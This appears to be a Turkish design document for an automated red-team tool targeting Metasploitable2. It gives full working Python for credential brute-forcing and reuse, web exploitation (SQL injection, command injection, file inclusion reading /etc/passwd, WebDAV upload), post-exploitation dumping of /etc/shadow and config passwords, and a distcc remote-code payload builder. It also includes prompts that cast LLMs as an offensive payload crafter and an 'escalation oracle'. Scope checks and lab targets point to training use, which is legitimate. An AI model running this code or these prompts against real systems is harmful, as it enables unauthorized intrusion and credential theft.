Default credential'ları dener, bulunan credential'ları diğer servislerde
yeniden kullanır (reuse), gerekirse brute force yapar.

#### Neden gerekli?
Test 5'te `msfadmin:msfadmin` SSH'de bulundu ama MySQL/PostgreSQL/Tomcat'te
denenmedi. Credential reuse, en kolay ve en etkili saldırı vektörüdür.

#### Tam Kod

```python
"""
AutoRedTeam - Credential Engine (Kimlik Bilgisi Motoru).

Default credential denemesi, credential reuse (bir serviste bulunan kimlik
bilgisini diger servislerde deneme) ve brute force islevlerini saglar.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from core.scope import is_target_allowed, run_command

logger = logging.getLogger(__name__)


@dataclass
class Credential:
    """Bulunan kimlik bilgisi."""
    username: str
    password: str
    service: str
    host: str
    port: int
    source: str = "default"  # default | reuse | brute | dump

    def to_dict(self) -> Dict[str, Any]:
        return {
            "username": self.username,
            "password": self.password,
            "service": self.service,
            "host": self.host,
            "port": self.port,
            "source": self.source,
        }


# Servis bazli default credential'lar
DEFAULT_CREDS: Dict[str, List[tuple]] = {
    "ssh": [("msfadmin", "msfadmin"), ("user", "user"), ("root", "root")],
    "telnet": [("msfadmin", "msfadmin"), ("user", "user")],
    "mysql": [("root", ""), ("root", "root"), ("msfadmin", "msfadmin")],
    "postgresql": [("postgres", "postgres"), ("postgres", "")],
    "tomcat": [("tomcat", "tomcat"), ("admin", "admin"), ("both", "tomcat")],
    "ftp": [("msfadmin", "msfadmin"), ("anonymous", "")],
    "smb": [("msfadmin", "msfadmin"), ("guest", "")],
    "vnc": [("", "")],  # null auth
}


class CredentialEngine:
    """
    Kimlik bilgisi denemesi ve yeniden kullanimi.
    """

    def __init__(self, target: str):
        self.target = target
        self.found: List[Credential] = []

    def try_default_creds(
        self,
        service: str,
        host: str,
        port: int,
    ) -> List[Credential]:
        """
        Servis bazli default credential'lari dener.
        """
        if not is_target_allowed(host):
            return []

        creds = DEFAULT_CREDS.get(service.lower(), [])
        results: List[Credential] = []
        for username, password in creds:
            if self._test_credential(service, host, port, username, password):
                cred = Credential(
                    username=username, password=password,
                    service=service, host=host, port=port, source="default",
                )
                results.append(cred)
                self.found.append(cred)
        return results

    def reuse_credentials(
        self,
        creds: List[Credential],
        services: List[str],
    ) -> List[Credential]:
        """
        Bulunan credential'lari diger servislerde dener.
        """
        results: List[Credential] = []
        for cred in creds:
            for svc in services:
                if svc == cred.service:
                    continue
                port = self._default_port(svc)
                if self._test_credential(svc, cred.host, port, cred.username, cred.password):
                    new_cred = Credential(
                        username=cred.username, password=cred.password,
                        service=svc, host=cred.host, port=port, source="reuse",
                    )
                    results.append(new_cred)
                    self.found.append(new_cred)
        return results

    def brute_force(
        self,
        service: str,
        host: str,
        port: int,
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
        max_attempts: int = 100,
    ) -> List[Credential]:
        """
        hydra ile brute force (kucuk wordlist, egitim hedefleri icin).
        """
        if not is_target_allowed(host):
            return []
        # hydra komutu servis bazli degisir
        hydra_service = {"ssh": "ssh", "ftp": "ftp", "mysql": "mysql",
                         "telnet": "telnet", "smb": "smb"}.get(service.lower())
        if not hydra_service:
            return []
        cmd = (
            f"hydra -l msfadmin -P {wordlist} -t 4 -f "
            f"{hydra_service}://{host}:{port} 2>&1 | head -50"
        )
        try:
            output = run_command(cmd, timeout=300)
            return self._parse_hydra_output(output, service, host, port)
        except Exception as e:
            logger.warning(f"[CredEngine] hydra hatasi: {e}")
            return []

    def _test_credential(
        self, service: str, host: str, port: int,
        username: str, password: str,
    ) -> bool:
        """
        Tek bir credential'i test eder. Servis bazli komut uretir.
        """
        svc = service.lower()
        if svc == "ssh":
            cmd = (
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
                f"-o ConnectTimeout=5 -p {port} {username}@{host} 'id' 2>&1"
            )
        elif svc == "mysql":
            cmd = (
                f"mysql -h {host} -P {port} -u {username} "
                f"{('-p' + password) if password else ''} -e 'SELECT 1' 2>&1"
            )
        elif svc == "ftp":
            cmd = (
                f"curl -s --max-time 5 -u {username}:{password} "
                f"ftp://{host}:{port}/ 2>&1"
            )
        elif svc == "tomcat":
            cmd = (
                f"curl -s --max-time 5 -u {username}:{password} "
                f"http://{host}:{port}/manager/html 2>&1 | head -5"
            )
        else:
            return False

        try:
            output = run_command(cmd, timeout=30)
            return self._is_success(output, svc)
        except Exception:
            return False

    def _is_success(self, output: str, service: str) -> bool:
        """Cikti basarili mi?"""
        if service == "ssh":
            return "uid=" in output
        if service == "mysql":
            return "1" in output and "ERROR" not in output.upper()
        if service == "ftp":
            return "230" in output or "drwx" in output
        if service == "tomcat":
            return "Tomcat" in output or "manager" in output.lower()
        return False

    def _parse_hydra_output(
        self, output: str, service: str, host: str, port: int,
    ) -> List[Credential]:
        """hydra ciktisini parse eder."""
        import re
        results = []
        for match in re.finditer(r"login:\s*(\S+)\s+password:\s*(\S+)", output):
            results.append(Credential(
                username=match.group(1), password=match.group(2),
                service=service, host=host, port=port, source="brute",
            ))
        return results

    def _default_port(self, service: str) -> int:
        return {
            "ssh": 22, "telnet": 23, "ftp": 21, "mysql": 3306,
            "postgresql": 5432, "tomcat": 8180, "smb": 445, "vnc": 5900,
        }.get(service.lower(), 0)

    def to_dict(self) -> Dict[str, Any]:
        return {"target": self.target, "found": [c.to_dict() for c in self.found]}
```

#### Nasıl Test Edilir?

`tests/test_credential_engine.py`:

```python
"""CredentialEngine unit testleri (mock ile)."""
from unittest.mock import patch
from core.credential_engine import CredentialEngine, Credential


def test_default_creds_ssh_success():
    engine = CredentialEngine("metasploitable2")
    with patch("core.credential_engine.run_command", return_value="uid=1000(msfadmin)"):
        creds = engine.try_default_creds("ssh", "metasploitable2", 22)
    assert len(creds) >= 1
    assert creds[0].username == "msfadmin"


def test_reuse_credentials():
    engine = CredentialEngine("metasploitable2")
    existing = [Credential("msfadmin", "msfadmin", "ssh", "metasploitable2", 22)]
    with patch("core.credential_engine.run_command", return_value="1"):
        reused = engine.reuse_credentials(existing, ["mysql"])
    assert len(reused) >= 1
    assert reused[0].source == "reuse"
```

---

### 3.2 `core/web_exploit_engine.py` — Web İstismar Motoru

#### Ne yapar?
Web uygulamalarında SQLi, XSS, command injection, file upload, LFI/RFI ve
default credential istismarını otomatikleştirir.

#### Neden gerekli?
Metasploitable2'nin en zengin zafiyet kaynağı web uygulamalarıdır (DVWA,
Mutillidae, phpMyAdmin, TikiWiki, WebDAV). Test 5'te bunlar sadece `nikto`
ile tarandı, hiç istismar edilmedi.

#### Tam Kod

```python
"""
AutoRedTeam - Web Exploit Engine (Web Uygulama Istismar Motoru).

DVWA, Mutillidae, phpMyAdmin, TikiWiki, WebDAV gibi web uygulamalarinda
SQLi, XSS, command injection, file upload, LFI/RFI ve default credential
istismarini otomatiklestirir.
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from core.scope import is_target_allowed, run_command

logger = logging.getLogger(__name__)


@dataclass
class WebFinding:
    """Web istismar bulgusu."""
    url: str
    vuln_type: str  # sqli | xss | cmd_injection | file_upload | lfi | default_creds
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    verified: bool = False
    severity: str = "High"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "vuln_type": self.vuln_type,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence[:1000],
            "verified": self.verified,
            "severity": self.severity,
        }


# Hedef bazli istismar stratejileri
WEB_TARGETS: Dict[str, Dict[str, Any]] = {
    "dvwa": {
        "base_path": "/dvwa/",
        "vulns": ["sqli", "xss", "cmd_injection", "file_upload"],
        "login": "/dvwa/login.php",
        "default_creds": [("admin", "password"), ("admin", "admin")],
    },
    "mutillidae": {
        "base_path": "/mutillidae/",
        "vulns": ["sqli", "xss", "lfi", "rfi"],
        "login": None,
        "default_creds": [],
    },
    "phpmyadmin": {
        "base_path": "/phpMyAdmin/",
        "vulns": ["default_creds", "sqli"],
        "login": "/phpMyAdmin/index.php",
        "default_creds": [("root", ""), ("root", "root")],
    },
    "tikiwiki": {
        "base_path": "/tikiwiki/",
        "vulns": ["cms_rce", "file_upload"],
        "login": None,
        "default_creds": [("admin", "admin")],
    },
    "webdav": {
        "base_path": "/dav/",
        "vulns": ["file_upload"],
        "login": None,
        "default_creds": [],
    },
}


class WebExploitEngine:
    """
    Web uygulamalari icin otomatik istismar motoru.
    """

    def __init__(self, target: str, base_url: str):
        self.target = target
        self.base_url = base_url.rstrip("/")
        self.findings: List[WebFinding] = []

    def exploit_sqli(self, url: str, param: str = "id") -> Optional[WebFinding]:
        """
        sqlmap ile SQL injection testi (DETECTION-ONLY).
        """
        if not is_target_allowed(self.target):
            return None
        # sqlmap detection mode: --batch --level=1 --risk=1 --smart
        cmd = (
            f"sqlmap -u \"{url}\" -p {param} --batch --level=1 --risk=1 "
            f"--smart --output-dir=/tmp/sqlmap 2>&1 | tail -40"
        )
        try:
            output = run_command(cmd, timeout=300)
            if self._sqli_confirmed(output):
                finding = WebFinding(
                    url=url, vuln_type="sqli", parameter=param,
                    payload="sqlmap auto", evidence=output[-800:],
                    verified=True, severity="Critical",
                )
                self.findings.append(finding)
                return finding
        except Exception as e:
            logger.warning(f"[WebExploit] sqlmap hatasi: {e}")
        return None

    def exploit_xss(self, url: str, param: str = "q") -> Optional[WebFinding]:
        """
        Reflected XSS testi (basit payload yansima kontrolu).
        """
        if not is_target_allowed(self.target):
            return None
        payload = "<script>alert(1)</script>"
        cmd = f"curl -s --max-time 10 \"{url}?{param}={payload}\" 2>&1"
        try:
            output = run_command(cmd, timeout=30)
            if payload in output:
                finding = WebFinding(
                    url=url, vuln_type="xss", parameter=param,
                    payload=payload, evidence=output[:500],
                    verified=True, severity="Medium",
                )
                self.findings.append(finding)
                return finding
        except Exception as e:
            logger.warning(f"[WebExploit] XSS hatasi: {e}")
        return None

    def exploit_cmd_injection(self, url: str, param: str = "ip") -> Optional[WebFinding]:
        """
        Command injection testi (basit; echo marker).
        """
        if not is_target_allowed(self.target):
            return None
        marker = "ART_MARKER_12345"
        payload = f"127.0.0.1; echo {marker}"
        cmd = f"curl -s --max-time 10 \"{url}?{param}={payload}\" 2>&1"
        try:
            output = run_command(cmd, timeout=30)
            if marker in output:
                finding = WebFinding(
                    url=url, vuln_type="cmd_injection", parameter=param,
                    payload=payload, evidence=output[:500],
                    verified=True, severity="Critical",
                )
                self.findings.append(finding)
                return finding
        except Exception as e:
            logger.warning(f"[WebExploit] CMD injection hatasi: {e}")
        return None

    def exploit_file_upload(self, url: str) -> Optional[WebFinding]:
        """
        WebDAV PUT / file upload testi.
        """
        if not is_target_allowed(self.target):
            return None
        test_file = "art_test.txt"
        content = "AutoRedTeam upload test"
        cmd = (
            f"curl -s -X PUT --max-time 10 -d '{content}' "
            f"\"{url.rstrip('/')}/{test_file}\" -w '%{{http_code}}' 2>&1"
        )
        try:
            output = run_command(cmd, timeout=30)
            if "201" in output or "200" in output:
                # Dogrula: dosyayi geri oku
                verify = run_command(f"curl -s --max-time 10 \"{url.rstrip('/')}/{test_file}\" 2>&1", timeout=30)
                if content in verify:
                    finding = WebFinding(
                        url=url, vuln_type="file_upload", payload="PUT",
                        evidence=f"Uploaded {test_file}, verified content.",
                        verified=True, severity="High",
                    )
                    self.findings.append(finding)
                    return finding
        except Exception as e:
            logger.warning(f"[WebExploit] File upload hatasi: {e}")
        return None

    def exploit_lfi(self, url: str, param: str = "page") -> Optional[WebFinding]:
        """
        Local File Inclusion testi.
        """
        if not is_target_allowed(self.target):
            return None
        payload = "../../../../etc/passwd"
        cmd = f"curl -s --max-time 10 \"{url}?{param}={payload}\" 2>&1"
        try:
            output = run_command(cmd, timeout=30)
            if "root:" in output and "/bin/" in output:
                finding = WebFinding(
                    url=url, vuln_type="lfi", parameter=param,
                    payload=payload, evidence=output[:500],
                    verified=True, severity="High",
                )
                self.findings.append(finding)
                return finding
        except Exception as e:
            logger.warning(f"[WebExploit] LFI hatasi: {e}")
        return None

    def exploit_default_creds(self, url: str, creds: List[tuple]) -> Optional[WebFinding]:
        """
        Web login default credential testi.
        """
        if not is_target_allowed(self.target):
            return None
        for username, password in creds:
            cmd = (
                f"curl -s --max-time 10 -u {username}:{password} "
                f"\"{url}\" -w '%{{http_code}}' 2>&1"
            )
            try:
                output = run_command(cmd, timeout=30)
                if "200" in output and "login" not in output.lower():
                    finding = WebFinding(
                        url=url, vuln_type="default_creds",
                        payload=f"{username}:{password}",
                        evidence=output[:300], verified=True, severity="Critical",
                    )
                    self.findings.append(finding)
                    return finding
            except Exception:
                continue
        return None

    def run_for_target(self, app_name: str) -> List[WebFinding]:
        """
        Belirli bir web uygulamasi icin tum istismarlari dener.
        """
        config = WEB_TARGETS.get(app_name.lower())
        if not config:
            return []
        base = f"{self.base_url}{config['base_path']}"
        results: List[WebFinding] = []

        for vuln in config["vulns"]:
            if vuln == "sqli":
                r = self.exploit_sqli(base)
            elif vuln == "xss":
                r = self.exploit_xss(base)
            elif vuln == "cmd_injection":
                r = self.exploit_cmd_injection(base)
            elif vuln == "file_upload":
                r = self.exploit_file_upload(base)
            elif vuln == "lfi":
                r = self.exploit_lfi(base)
            elif vuln == "default_creds":
                r = self.exploit_default_creds(
                    f"{self.base_url}{config.get('login', '')}",
                    config.get("default_creds", []),
                )
            else:
                r = None
            if r:
                results.append(r)
        return results

    def _sqli_confirmed(self, output: str) -> bool:
        """sqlmap ciktisinda SQLi dogrulandi mi?"""
        markers = [
            "is vulnerable",
            "Parameter: ",
            "Type: ",
            "sqlmap identified",
        ]
        return any(m in output for m in markers)

    def to_dict(self) -> Dict[str, Any]:
        return {"target": self.target, "findings": [f.to_dict() for f in self.findings]}
```

#### Nasıl Test Edilir?

`tests/test_web_exploit_engine.py`:

```python
"""WebExploitEngine unit testleri (mock ile)."""
from unittest.mock import patch
from core.web_exploit_engine import WebExploitEngine


def test_xss_detection():
    engine = WebExploitEngine("metasploitable2", "http://metasploitable2")
    with patch("core.web_exploit_engine.run_command",
               return_value="<script>alert(1)</script>"):
        finding = engine.exploit_xss("http://metasploitable2/dvwa/", "q")
    assert finding is not None
    assert finding.vuln_type == "xss"


def test_cmd_injection_detection():
    engine = WebExploitEngine("metasploitable2", "http://metasploitable2")
    with patch("core.web_exploit_engine.run_command",
               return_value="ART_MARKER_12345"):
        finding = engine.exploit_cmd_injection("http://metasploitable2/dvwa/", "ip")
    assert finding is not None
    assert finding.vuln_type == "cmd_injection"


def test_lfi_detection():
    engine = WebExploitEngine("metasploitable2", "http://metasploitable2")
    with patch("core.web_exploit_engine.run_command",
               return_value="root:x:0:0:root:/root:/bin/bash"):
        finding = engine.exploit_lfi("http://metasploitable2/mutillidae/", "page")
    assert finding is not None
    assert finding.vuln_type == "lfi"
```

---

### 3.3 `core/post_exploit.py` — Foothold Sonrası

#### Ne yapar?
Foothold alındıktan sonra sistem keşfi, privesc vektörü bulma, credential
dump ve lateral movement yapar.

#### Neden gerekli?
Test 5'te root alındı ama sistem keşfi yapılmadı; privesc bulguları tekrar etti.

#### Tam Kod

```python
"""
AutoRedTeam - Post-Exploitation Engine (Foothold Sonrasi Kesif).

Foothold alindiktan sonra sistem kesfi, privesc vektoru bulma, credential
dump ve lateral movement islevlerini saglar.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from core.scope import is_target_allowed, run_command

logger = logging.getLogger(__name__)


@dataclass
class Session:
    """Aktif oturum."""
    host: str
    user: str
    privilege: str  # user | root
    method: str  # ssh | shell | web
    port: int = 22

    def to_dict(self) -> Dict[str, Any]:
        return {
            "host": self.host, "user": self.user,
            "privilege": self.privilege, "method": self.method, "port": self.port,
        }


@dataclass
class PrivescVector:
    """Yetki yukseltme vektoru."""
    technique: str  # suid | sudo | kernel | cron | capability
    detail: str
    command: str
    exploitable: bool = False
    evidence: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "technique": self.technique, "detail": self.detail,
            "command": self.command, "exploitable": self.exploitable,
            "evidence": self.evidence,
        }


class PostExploit:
    """
    Foothold sonrasi kesif ve yetki yukseltme.
    """

    def __init__(self, session: Session):
        self.session = session
        self.privesc_vectors: List[PrivescVector] = []

    def _run(self, command: str, timeout: int = 60) -> str:
        """Oturum uzerinden komut calistirir (SSH varsayimi)."""
        if not is_target_allowed(self.session.host):
            return ""
        if self.session.method == "ssh":
            ssh_cmd = (
                f"sshpass -p '{{PW}}' ssh -o StrictHostKeyChecking=no "
                f"-o ConnectTimeout=5 -p {self.session.port} "
                f"{self.session.user}@{self.session.host} '{command}' 2>&1"
            )
            # Not: gercek kullanimda sifre session'da saklanmali
            return run_command(ssh_cmd, timeout=timeout)
        return ""

    def enumerate_system(self) -> Dict[str, Any]:
        """Sistem bilgisi toplar."""
        info = {}
        for key, cmd in {
            "uname": "uname -a",
            "users": "cat /etc/passwd",
            "network": "ip addr 2>/dev/null || ifconfig",
            "processes": "ps aux | head -20",
        }.items():
            info[key] = self._run(cmd)
        return info

    def find_privesc(self) -> List[PrivescVector]:
        """
        Yetki yukseltme vektorlerini arar (SUID, sudo, kernel, cron).
        """
        vectors: List[PrivescVector] = []

        # 1. SUID binaries
        suid_out = self._run("find / -perm -4000 -type f 2>/dev/null")
        if suid_out:
            vectors.append(PrivescVector(
                technique="suid", detail="SUID binaries found",
                command="find / -perm -4000 -type f",
                evidence=suid_out[:500],
            ))

        # 2. sudo -l
        sudo_out = self._run("sudo -n -l 2>/dev/null")
        if sudo_out and "not allowed" not in sudo_out.lower():
            vectors.append(PrivescVector(
                technique="sudo", detail="sudo permissions",
                command="sudo -l", exploitable="(ALL) ALL" in sudo_out,
                evidence=sudo_out[:500],
            ))

        # 3. Kernel version
        kernel_out = self._run("uname -r")
        if kernel_out:
            vectors.append(PrivescVector(
                technique="kernel", detail=f"Kernel {kernel_out.strip()}",
                command="uname -r", evidence=kernel_out.strip(),
            ))

        # 4. Cron jobs
        cron_out = self._run("cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null")
        if cron_out:
            vectors.append(PrivescVector(
                technique="cron", detail="Cron jobs",
                command="cat /etc/crontab", evidence=cron_out[:500],
            ))

        self.privesc_vectors = vectors
        return vectors

    def dump_credentials(self) -> List[Dict[str, str]]:
        """Credential dosyalarini okur (root ise)."""
        creds = []
        # /etc/shadow (root gerekir)
        shadow = self._run("cat /etc/shadow 2>/dev/null")
        if shadow and "root:" in shadow:
            creds.append({"source": "/etc/shadow", "content": shadow[:1000]})
        # MySQL config
        mysql_cfg = self._run("cat /var/www/*/config*.php 2>/dev/null | grep -i pass")
        if mysql_cfg:
            creds.append({"source": "web config", "content": mysql_cfg[:500]})
        return creds

    def to_dict(self) -> Dict[str, Any]:
        return {
            "session": self.session.to_dict(),
            "privesc_vectors": [v.to_dict() for v in self.privesc_vectors],
        }
```

#### Nasıl Test Edilir?

`tests/test_post_exploit.py`:

```python
"""PostExploit unit testleri (mock ile)."""
from unittest.mock import patch
from core.post_exploit import PostExploit, Session


def test_find_privesc_suid():
    session = Session("metasploitable2", "msfadmin", "user", "ssh")
    pe = PostExploit(session)
    with patch.object(pe, "_run", return_value="/bin/su\n/bin/mount"):
        vectors = pe.find_privesc()
    assert any(v.technique == "suid" for v in vectors)


def test_find_privesc_sudo_all():
    session = Session("metasploitable2", "msfadmin", "user", "ssh")
    pe = PostExploit(session)
    with patch.object(pe, "_run", side_effect=lambda c, timeout=60: {
        "find / -perm -4000 -type f 2>/dev/null": "",
        "sudo -n -l 2>/dev/null": "(ALL) ALL",
        "uname -r": "2.6.24",
        "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null": "",
    }.get(c, "")):
        vectors = pe.find_privesc()
    sudo_vec = next((v for v in vectors if v.technique == "sudo"), None)
    assert sudo_vec is not None
    assert sudo_vec.exploitable
```

---

## 4. Aşama 3: LLM Danışman Entegrasyonu

> **Hedef:** LLM'i "karar verici" rolünden "danışman" rolüne taşımak.
> **Süre:** ~1 hafta

### 4.1 Yeni Orkestrasyon Akışı

`core/assessment_assistant.py` içindeki `run()` döngüsünü değiştir:

**Eski akış:**
```python
while step < max_steps:
    suggestion = self._ask_llm_for_suggestion(context)  # LLM karar verir
    execute(suggestion)
```

**Yeni akış:**
```python
# 1. Deterministik çekirdek
recon = recon_engine.run_full_recon(target)
vulns = vuln_mapper.map_all(recon.services)
planner = ExploitPlanner(target)
planner.build_plan(vulns)
sm = AssessmentStateMachine()

# 2. Deterministik istismar döngüsü
while not planner.is_complete():
    step = planner.next_step()
    if step is None:
        break

    # LLM'den payload iste (yalnizca gerekirse)
    payload = self._get_payload_from_llm(step) if step.exploit_module else None

    result = exploit_runner.dispatch_exploit(
        step.exploit_module, target, approved=True
    )
    evidence = verifier.verify_exploit(result)

    if evidence.verified:
        planner.mark_result(step, success=True, evidence=evidence.to_dict())
        sm.on_foothold()
        # Post-exploitation
        post = PostExploit(Session(target, "msfadmin", "user", "ssh"))
        post.find_privesc()
    else:
        planner.mark_result(step, success=False)
        planner.try_alternative(step)

# 3. LLM'den rapor anlatisi iste (DeepSeek)
report = self._generate_report_with_llm(findings)
```

### 4.2 LLM Rol Tanımları (Prompt'lar)

#### CyberStrike 35B — Payload Crafter

```python
PAYLOAD_CRAFTER_PROMPT = """You are an offensive security payload specialist.
A standard exploit failed against a target. Generate an ALTERNATIVE payload
or technique.

Target: {target}
Service: {service} {version}
Port: {port}
Failed exploit: {exploit_module}
Failure output: {failure_output}

Provide a concrete, technical alternative. Output ONLY the payload/command,
no explanation."""
```

#### DeepSeek V4 Flash — Triage Advisor

```python
TRIAGE_ADVISOR_PROMPT = """You are a security assessment triage advisor.
Given the current evidence, decide the next highest-value target.

Current findings:
{findings_summary}

Untested services: {untested}
Obtained credentials: {credentials}

Answer in JSON:
{"priority_target": "...", "reason": "...", "confidence": 0.0-1.0}"""
```

#### Claude — Escalation Oracle

```python
ESCALATION_ORACLE_PROMPT = """You are a supreme escalation oracle.
All standard exploitation paths have been exhausted. The system is stuck.

Target: {target}
Attempted: {attempted_steps}
Findings: {findings}

Provide a creative, non-obvious attack strategy. Think laterally."""
```

### 4.3 Entegrasyon Noktaları

| Mevcut Kod | Değişiklik |
|---|---|
| `assessment_assistant.py:655` `_ask_llm_for_suggestion` | Artık her adımda çağrılmaz; sadece payload/triage için |
| `assessment_assistant.py:676` periyodik orchestrator | Kaldırılır; planner deterministik |
| `assessment_assistant.py:1060` `should_trigger_rescue` | Kaldırılır; planner fallback yapar |
| `assessment_assistant.py:1781` `get_fallback_action_for_untested` | Kaldırılır; planner planı yönetir |
| `orchestrator.py` | Triage Advisor + Escalation Oracle rollerine indirgenir |

---

## 5. Aşama 4: Rapor & Korelasyon

> **Hedef:** Zincirli, CVSS'li, anlatılı rapor.
> **Süre:** ~1 hafta

### 5.1 `core/finding_correlator.py` — Bulgu Korelasyonu

```python
"""
AutoRedTeam - Finding Correlator (Bulgu Korelasyonu).

Ayni kategori/hedef bulgulari birlestirir, privesc bulgularini tek zincirde
toplar ve saldiri anlatilari (attack chain) olusturur.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List

logger = logging.getLogger(__name__)


@dataclass
class AttackChain:
    """Saldiri zinciri."""
    name: str
    steps: List[Dict[str, Any]] = field(default_factory=list)
    severity: str = "High"
    impact: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name, "steps": self.steps,
            "severity": self.severity, "impact": self.impact,
        }


class FindingCorrelator:
    """Bulgulari birlestirir ve zincirler olusturur."""

    def deduplicate(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Ayni kategori + hedef + tool bulgulari birlestirir.
        Ozellikle privesc bulgulari tek bulgu olur.
        """
        grouped: Dict[str, Dict[str, Any]] = {}
        for f in findings:
            key = f"{f.get('category')}|{f.get('target')}|{f.get('tool')}"
            if key in grouped:
                # Kanitlari birlestir
                existing = grouped[key]
                existing["evidence_snippet"] = (
                    existing.get("evidence_snippet", "") + "\n---\n"
                    + f.get("evidence_snippet", "")
                )
                existing["merged_count"] = existing.get("merged_count", 1) + 1
            else:
                grouped[key] = dict(f)
        return list(grouped.values())

    def build_chains(self, findings: List[Dict[str, Any]]) -> List[AttackChain]:
        """
        Bulgulardan saldiri zincirleri olusturur.
        """
        chains: List[AttackChain] = []

        # Privesc zinciri
        privesc = [f for f in findings if "Privilege" in f.get("category", "")]
        if privesc:
            chains.append(AttackChain(
                name="Privilege Escalation Chain",
                steps=[{"finding": f.get("finding_id"), "detail": f.get("evidence_snippet", "")[:200]}
                       for f in privesc],
                severity="Critical",
                impact="Full system compromise (root access).",
            ))

        # Foothold zinciri
        creds = [f for f in findings if "Credential" in f.get("category", "")]
        backdoor = [f for f in findings if "Backdoor" in f.get("category", "")]
        if creds or backdoor:
            chains.append(AttackChain(
                name="Initial Access Chain",
                steps=[{"finding": f.get("finding_id"), "detail": f.get("category")}
                       for f in (creds + backdoor)],
                severity="Critical",
                impact="Unauthorized remote access obtained.",
            ))

        return chains
```

### 5.2 `core/cvss_scorer.py` — CVSS Skoru

```python
"""
AutoRedTeam - CVSS Scorer (CVSS v3.1 Skorlayici).

Bulgu kategorisine gore CVSS v3.1 skoru ve vektoru uretir.
"""

from __future__ import annotations

from typing import Any, Dict, Tuple

# Kategori -> (base_score, vector)
CVSS_MAP: Dict[str, Tuple[float, str]] = {
    "Weak Default Credentials": (9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "Backdoor Exploitation": (9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "Privilege Escalation": (8.8, "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"),
    "SQL Injection": (9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "Command Injection": (9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "File Upload": (8.8, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"),
    "Local File Inclusion": (7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Cross-Site Scripting": (6.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    "Known vulnerable service version": (7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "Old Software Version": (5.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
}


def score_finding(finding: Dict[str, Any]) -> Dict[str, Any]:
    """Bir bulguya CVSS skoru ekler."""
    category = finding.get("category", "")
    score, vector = CVSS_MAP.get(category, (5.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"))
    finding["cvss_score"] = score
    finding["cvss_vector"] = vector
    return finding


def severity_from_cvss(score: float) -> str:
    """CVSS skorundan severity."""
    if score >= 9.0:
        return "Critical"
    if score >= 7.0:
        return "High"
    if score >= 4.0:
        return "Medium"
    if score > 0:
        return "Low"
    return "Informational"
```

---

## 6. Aşama 5: Gerçek Dünya

> **Hedef:** Bug bounty hazırlığı.
> **Süre:** ~1 hafta

### 6.1 Dinamik Scope

`config/allowed_targets.txt` yerine `config/scope.yaml`:

```yaml
scope:
  domains:
    - "*.example.com"
  ips:
    - "10.0.0.0/24"
  excluded:
    - "admin.example.com"
rate_limit:
  requests_per_second: 10
  delay_ms: 100
proxy:
  enabled: false
  url: "http://127.0.0.1:8080"
```

`core/scope.py`'ye ekle:

```python
import fnmatch
import ipaddress

def is_target_in_scope(target: str, scope: dict) -> bool:
    """Domain/IP/wildcard scope kontrolu."""
    # Excluded kontrolu
    for ex in scope.get("excluded", []):
        if fnmatch.fnmatch(target, ex):
            return False
    # Domain kontrolu
    for domain in scope.get("domains", []):
        if fnmatch.fnmatch(target, domain):
            return True
    # IP range kontrolu
    try:
        ip = ipaddress.ip_address(target)
        for net in scope.get("ips", []):
            if ip in ipaddress.ip_network(net, strict=False):
                return True
    except ValueError:
        pass
    return False
```

### 6.2 Rate Limiting

```python
import time

class RateLimiter:
    def __init__(self, rps: int = 10):
        self.delay = 1.0 / rps
        self._last = 0.0

    def wait(self):
        elapsed = time.time() - self._last
        if elapsed < self.delay:
            time.sleep(self.delay - elapsed)
        self._last = time.time()
```

### 6.3 API Pentest

```python
class APIPentestEngine:
    def discover_openapi(self, base_url: str) -> List[str]:
        """OpenAPI/Swagger endpoint'lerini kesfeder."""
        paths = ["/swagger.json", "/openapi.json", "/api-docs", "/v2/api-docs"]
        found = []
        for p in paths:
            out = run_command(f"curl -s --max-time 5 {base_url}{p}", timeout=10)
            if out and "openapi" in out.lower() or "swagger" in out.lower():
                found.append(p)
        return found

    def test_endpoints(self, spec: dict) -> List[Dict]:
        """OpenAPI spec'inden endpoint'leri test eder."""
        ...
```

---

## 7. Exploit Payload Düzeltmeleri

### 7.1 distcc_exec (CVE-2004-2687)

**Sorun:** `#: None: command not found`
**Çözüm:** Doğru distcc protokol formatı.

```python
def build_distcc_payload(command: str) -> bytes:
    """
    distcc protokolu: DIST + ARGC + ARGV + DOTI
    """
    args = ["sh", "-c", command]
    payload = b"DIST00000001"
    payload += f"ARGC{len(args):08x}".encode()
    for arg in args:
        payload += f"ARGV{len(arg):08x}".encode() + arg.encode()
    payload += b"DOTI00000001"
    return payload
```

### 7.2 unrealircd_backdoor (CVE-2010-2075)

**Sorun:** `451 AB; :You have not registered`
**Çözüm:** Backdoor tetikleme dizisi.
